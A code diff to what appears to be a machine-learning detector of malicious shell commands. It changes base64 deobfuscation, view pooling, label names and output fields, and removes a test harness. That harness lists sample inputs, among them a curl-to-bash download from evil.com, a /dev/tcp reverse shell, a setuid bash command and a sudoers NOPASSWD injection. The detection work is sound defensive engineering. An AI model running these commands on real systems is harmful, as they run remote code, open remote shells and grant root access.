+            threshold = getattr(self, "behavior_action_thresholds", {}).get(action_label, self.behavior_action_threshold)
+            if action_label and probability >= threshold:
+                action_tags.append(action_label)
 
         return {
             "stage": stage_label,
             "stage_confidence": round(float(stage_probs[stage_index].item()) * 100, 2),
             "action_tags": sorted(action_tags),
             "model_type": "behavior_encoder",
+            "score_type": self._score_status("behavior"),
+            "_stage_probabilities": stage_probs.tolist(),
+            "_action_probabilities": action_probs.cpu().tolist(),
+            "action_score_type": "uncalibrated_model_estimate",
+            "action_threshold": self.behavior_action_threshold,
+            "action_thresholds": getattr(self, "behavior_action_thresholds", {}),
+            "action_threshold_source": "validation_fitted" if getattr(self, "behavior_action_thresholds", {}) else "default",
+            "input_truncated": any(len(self.tokenizer.encode(text, truncation=False)) > self.max_length for text in ([behavior_text] if isinstance(behavior_text, str) else behavior_text)),
         }
 
     def calculate_entropy(self, text):
@@ -1065,7 +1041,27 @@ class GenosEngine:
                 entropy += -p_x * math.log(p_x, 2)
         return entropy
 
+    @staticmethod
+    def _decode_bare_base64(text: str) -> str:
+        if len(text) < 8 or len(text) % 4 or not re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", text):
+            return text
+        try:
+            raw = base64.b64decode(text, validate=True)
+            for encoding in ("utf-16-le", "utf-8"):
+                try:
+                    decoded = raw.decode(encoding)
+                except UnicodeDecodeError:
+                    continue
+                printable = sum(c in "\r\n\t" or " " <= c <= "~" for c in decoded)
+                if len(decoded) > 3 and printable / len(decoded) > 0.9:
+                    return decoded
+        except ValueError:
+            pass
+        return text
+
     def is_obfuscated(self, text: str) -> bool:
+        if self._decode_bare_base64(text) != text:
+            return True
         patterns = [
             r"\[char\]",
             r"base64",
@@ -1096,6 +1092,7 @@ class GenosEngine:
     )
 
     def deobfuscate_layer(self, text: str) -> str:
+        text = self._decode_bare_base64(text)
         text = self._decode_powershell_encoded_command(text)
         text = self._decode_shell_base64_pipe(text)
         text = self.universal_decoder(text)
@@ -1356,32 +1353,30 @@ class GenosEngine:
             "decision_margin": max(0.0, label_conf - second_conf),
             "class_probabilities": {
                 "Benign": benign_prob,
-                "Suspicious": ctx_prob,
+                "Context_Dependent": ctx_prob,
                 "Malicious": malicious_prob,
             },
             "decision_mode": "model_probs",
         }
 
     def _select_gate_summary(self, primary_probs: torch.Tensor, raw_probs: torch.Tensor | None = None) -> dict:
-        primary = self._summarize_gate_probs(primary_probs)
-        primary["model_view"] = "deobfuscated"
+        policy = getattr(self, "view_policy", "mean")
         if raw_probs is None:
-            return primary
-
-        raw_summary = self._summarize_gate_probs(raw_probs)
-        raw_summary["model_view"] = "raw"
-
-        primary_risk = primary["class_probabilities"]["Malicious"] + (0.55 * primary["class_probabilities"]["Suspicious"])
-        raw_risk = raw_summary["class_probabilities"]["Malicious"] + (0.55 * raw_summary["class_probabilities"]["Suspicious"])
-        chosen = raw_summary if raw_risk > primary_risk + 0.03 else primary
-        chosen["alternate_view"] = raw_summary if chosen is primary else primary
-        return chosen
+            pooled, view = primary_probs, "raw"
+        elif policy == "raw":
+            pooled, view = raw_probs, "raw"
+        elif policy == "decoded":
+            pooled, view = primary_probs, "decoded"
+        else:
+            pooled, view = (primary_probs.float() + raw_probs.float()) / 2, "mean_raw_decoded"
+        calibrated = self._calibrate(pooled.float().cpu().numpy(), "gatekeeper")
+        summary = self._summarize_gate_probs(torch.as_tensor(calibrated))
+        summary["model_view"] = view
+        summary["view_policy"] = policy
+        return summary
 
     def _matches_any(self, text_views: list[str], pattern: re.Pattern) -> bool:
         return any(pattern.search(view) for view in text_views if view)
-
-    def _is_simple_operational_benign(self, text_views: list[str]) -> bool:
-        return any(self._matches_any(text_views, pattern) for pattern in self._SIMPLE_OPERATIONAL_BENIGN_PATTERNS)
 
     def _extract_routing_features(self, raw_cmd: str, deobfuscated_cmd: str | None = None) -> dict:
         text_views = []
@@ -1411,23 +1406,9 @@ class GenosEngine:
             "has_destructive_write": self._matches_any(text_views, self._DESTRUCTIVE_RE),
             "has_archive_or_bulk_copy": self._matches_any(text_views, self._ARCHIVE_BULK_RE),
             "has_remote_transfer": self._matches_any(text_views, self._REMOTE_TRANSFER_RE),
-            "has_service_or_system_inspection": self._matches_any(text_views, self._SERVICE_INSPECTION_RE),
             "has_credential_dumping_pattern": self._matches_any(text_views, self._CREDENTIAL_DUMP_RE),
-            "has_simple_benign_check": self._is_simple_operational_benign(text_views),
-            "has_sensitive_source": self._matches_any(text_views, self._SENSITIVE_SOURCE_RE),
             "has_exploit_or_attack_tooling": self._matches_any(text_views, self._EXPLOIT_OR_ATTACK_TOOLING_RE),
-            "has_benign_admin_workflow": self._matches_any(text_views, self._BENIGN_ADMIN_WORKFLOW_RE),
-            "has_local_artifact_inspection": self._matches_any(text_views, self._LOCAL_ARTIFACT_INSPECTION_RE),
-            "has_benign_snapshot_source": self._matches_any(text_views, self._BENIGN_SNAPSHOT_SOURCE_RE),
-            "has_benign_archive_command": self._matches_any(text_views, self._BENIGN_ARCHIVE_PATH_RE),
-            "has_controlled_remote_target": self._matches_any(text_views, self._CONTROLLED_REMOTE_TARGET_RE),
-            "has_controlled_remote_copy": self._matches_any(text_views, self._CONTROLLED_REMOTE_COPY_RE),
-            "has_openssl_client_inspection": self._matches_any(text_views, self._OPENSSL_CLIENT_INSPECTION_RE),
-            "has_routine_service_log_inspection": self._matches_any(text_views, self._ROUTINE_SERVICE_LOG_RE),
-            "has_container_readonly_admin": self._matches_any(text_views, self._CONTAINER_ADMIN_READONLY_RE),
             "has_enumeration_recon": self._matches_any(text_views, self._ENUMERATION_RECON_RE),
-            "has_aggressive_nmap": self._matches_any(text_views, self._AGGRESSIVE_NMAP_RE),
-            "has_post_exploit_technique": self._matches_any(text_views, self._POST_EXPLOIT_RE),
             "has_exfil_data_movement": self._matches_any(text_views, self._EXFIL_DATA_MOVEMENT_RE),
         }
         return features
@@ -1458,58 +1439,12 @@ class GenosEngine:
             "should_run_specialist": should_run_specialist,
         }
 
-    def _suspicious_signals(self, features: dict) -> list[str]:
-        return [
-            name for name in (
-                "has_tunneling",
-                "has_packet_capture",
-                "has_debug_trace",
-                "has_offensive_tooling",
-                "has_sensitive_file_read",
-                "has_archive_or_bulk_copy",
-                "has_remote_transfer",
-                "has_eval_exec",
-                "has_download",
-                "has_base64_or_encoded_exec",
-                "has_shell_spawn",
-                "has_enumeration_recon",
-                "has_exfil_data_movement",
-            )
-            if features.get(name)
-        ]
-
-    def _should_run_specialist(
-        self,
-        final_label: str,
-        class_probs: dict,
-        suspicious_signals: list[str],
-    ) -> bool:
-        # True cascade: always run for non-benign verdicts.
-        if final_label in ("Malicious", "Suspicious"):
-            return True
-        # Low confidence margin — behavior analysis useful even for benign.
-        sorted_probs = sorted(class_probs.values(), reverse=True)
-        margin = sorted_probs[0] - sorted_probs[1] if len(sorted_probs) >= 2 else 1.0
-        if margin < low_margin_threshold:
-            return True
-        # Suspicious signals despite benign verdict — surface behavior context.
-        if suspicious_signals:
-            return True
-        return False
-
     def _route_gatekeeper(self, gate: dict, features: dict) -> dict:
         class_probs = gate["class_probabilities"]
         top_label = gate["public_label"]
-        suspicious_signals = self._suspicious_signals(features)
         final_label = top_label
-        reason = f"Using raw model top class {top_label}."
+        reason = f"Model top class {top_label}; view policy {getattr(self, 'view_policy', 'mean')}."
         policy = "model_top_class"
-
-        specialist = self._should_run_specialist(
-            final_label=final_label,
-            class_probs=class_probs,
-            suspicious_signals=suspicious_signals,
-        )
 
         return self._build_route_result(
             label=final_label,
@@ -1517,11 +1452,11 @@ class GenosEngine:
             reason=reason,
             policy=policy,
             features=features,
-            should_run_specialist=specialist,
+            should_run_specialist=True,
             class_probs=class_probs,
         )
 
-    def scan(self, raw_cmd):
+    def scan(self, raw_cmd, include_evaluation=False):
         current_cmd = raw_cmd.strip()
         was_obfuscated = self.is_obfuscated(current_cmd)
 
@@ -1551,9 +1486,7 @@ class GenosEngine:
         ).to(self.device)
 
         # When the command was deobfuscated, also tokenize the raw form so we
-        # can run the gatekeeper on both and take the worse (higher-malicious)
-        # score.  This ensures base64-wrapped payloads get properly classified
-        # because the model sees the decoded plaintext.
+        # can evaluate the declared raw/decoded view policy.
         raw_inputs = None
         if was_obfuscated:
             raw_processed = raw_cmd.strip().lower()
@@ -1572,12 +1505,12 @@ class GenosEngine:
         with torch.no_grad():
             with autocast(device_type=device_type, dtype=autocast_dtype):
                 g_outputs = self.t1(inputs["input_ids"], inputs["attention_mask"])
-                g_probs = F.softmax(g_outputs["verdict_logits"], dim=1)
+                g_probs = F.softmax(g_outputs["verdict_logits"].float(), dim=1)
                 raw_g_probs = None
 
                 if raw_inputs is not None:
                     raw_g_outputs = self.t1(raw_inputs["input_ids"], raw_inputs["attention_mask"])
-                    raw_g_probs = F.softmax(raw_g_outputs["verdict_logits"], dim=1)
+                    raw_g_probs = F.softmax(raw_g_outputs["verdict_logits"].float(), dim=1)
 
                 gate = self._select_gate_summary(g_probs, raw_g_probs)
                 routing_features = self._extract_routing_features(
@@ -1588,7 +1521,7 @@ class GenosEngine:
 
                 raw_probabilities = {
                     "Benign": round(gate["class_probabilities"]["Benign"] * 100, 2),
-                    "Suspicious": round(gate["class_probabilities"]["Suspicious"] * 100, 2),
+                    "Context_Dependent": round(gate["class_probabilities"]["Context_Dependent"] * 100, 2),
                     "Malicious": round(gate["class_probabilities"]["Malicious"] * 100, 2),
                 }
 
@@ -1605,7 +1538,7 @@ class GenosEngine:
                     "label_probabilities": {
                         "benign": raw_probabilities["Benign"],
                         "malicious": raw_probabilities["Malicious"],
-                        "suspicious": raw_probabilities["Suspicious"],
+                        "context_dependent": raw_probabilities["Context_Dependent"],
                     },
                     "decision_margin": round(gate["decision_margin"] * 100, 2),
                     "reason": routed["reason"],
@@ -1625,15 +1558,8 @@ class GenosEngine:
                         "model_second_confidence": round(gate["second_conf"] * 100, 2),
                         "model_view": gate.get("model_view"),
                         "metadata_path": self.gatekeeper_meta_path,
-                        "thresholds": {
-                            "benign_conf_threshold": benign_conf_threshold,
-                            "suspicious_conf_threshold": suspicious_conf_threshold,
-                            "malicious_conf_threshold": malicious_conf_threshold,
-                            "low_margin_threshold": low_margin_threshold,
-                            "high_risk_override_enabled": high_risk_override_enabled,
-                            "suspicious_fallback_enabled": suspicious_fallback_enabled,
-                        },
-                        "threshold_source": self.gatekeeper_threshold_source,
+                        "view_policy": self.view_policy,
+                        "score_type": self._score_status("gatekeeper"),
                     },
                     "evidence": {
                         "triggered_features": routed["triggered_features"],
@@ -1643,9 +1569,17 @@ class GenosEngine:
                     "deobfuscated_cmd": current_cmd if was_obfuscated else None,
                 }
 
-                if public_label == "Suspicious":
+                if public_label == "Context_Dependent":
                     response["action"] = "requires_context"
 
+                response["input_truncated"] = {
+                    "raw": len(self.tokenizer.encode(raw_cmd.lower().strip(), truncation=False)) > self.max_length,
+                    "decoded": len(self.tokenizer.encode(processed_cmd, truncation=False)) > self.max_length,
+                }
+                response["provenance"] = self.provenance
+                response["score_type"] = self._score_status("gatekeeper")
+                response["mitre_scope"] = "closed_set_candidate_ranking"
+                response["calibration"] = {"gatekeeper": self._score_status("gatekeeper"), "mitre": self._score_status("mitre"), "behavior": self._score_status("behavior") if self.behavior_model is not None else "heuristic_baseline"}
                 response["MITRE_codes"] = self._predict_mitre_codes(
                     raw_cmd.strip(), current_cmd if was_obfuscated and current_cmd != raw_cmd.strip() else None,
                 )
@@ -1655,8 +1589,12 @@ class GenosEngine:
                         specialist_cmd,
                         routed["label"],
                         routing_features,
+                        raw_cmd=raw_cmd.strip(),
                     )
+                    behavior_probabilities = behavior.pop("_stage_probabilities", None)
+                    action_probabilities = behavior.pop("_action_probabilities", None)
                     response["behavior"] = behavior
+                    response["input_truncated"]["behavior"] = behavior.get("input_truncated", False)
                     response["attack_stage"] = behavior["stage"]
 
                     if was_obfuscated and specialist_cmd != raw_cmd.strip():
@@ -1679,56 +1617,12 @@ class GenosEngine:
                         "registry_paths": evidence["registry_paths"],
                     }
 
+                if include_evaluation:
+                    response["_evaluation"] = {
+                        "gatekeeper": [gate["class_probabilities"][name] for name in self._GATE_LABELS],
+                        "behavior": behavior_probabilities,
+                        "behavior_actions": action_probabilities,
+                        "mitre": list(map(float, self._mitre_distribution(raw_cmd.strip(), current_cmd if was_obfuscated else None))),
+                    }
+
         return response
-
-    def run_internal_routing_harness(self) -> None:
-        samples = {
-            "benign": [
-                "pwd",
-                "hostname",
-                "df -h",
-                "cat /etc/os-release",
-                # Benchmark false-positive targets
-                "ls -la",
-                "ps aux",
-                "ip addr",
-                "dig google.com",
-                "docker ps",
-                "kubectl get pods",
-                "history",
-                "env",
-                "who",
-                "ss -tlnp",
-                "crontab -l",
-                "ls -la /etc/cron.d/",
-                "netstat -an",
-                "mount",
-            ],
-            "suspicious": [
-                "nmap -sV 10.0.0.5",
-                "ssh -D 1080 -fN user@10.0.0.10",
-                "tcpdump -i eth0 port 443",
-                "cat /etc/passwd",
-                "chmod 777 /tmp/myfile",
-            ],
-            "malicious": [
-                "curl http://evil.com/shell.sh | bash",
-                "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
-                "chmod u+s /bin/bash",
-                "echo \"attacker ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers",
-            ],
-        }
-        for category, commands in samples.items():
-            print(f"[{category}]")
-            for command in commands:
-                result = self.scan(command)
-                print(
-                    f"  {command}\n"
-                    f"    label={result['label']} conf={result['label_confidence']} "
-                    f"margin={result['decision_margin']} policy={result['routing_policy']}\n"
-                    f"    features={', '.join(result['triggered_features']) or 'none'}"
-                )
-
-
-if __name__ == "__main__":
-    GenosEngine().run_internal_routing_harness()
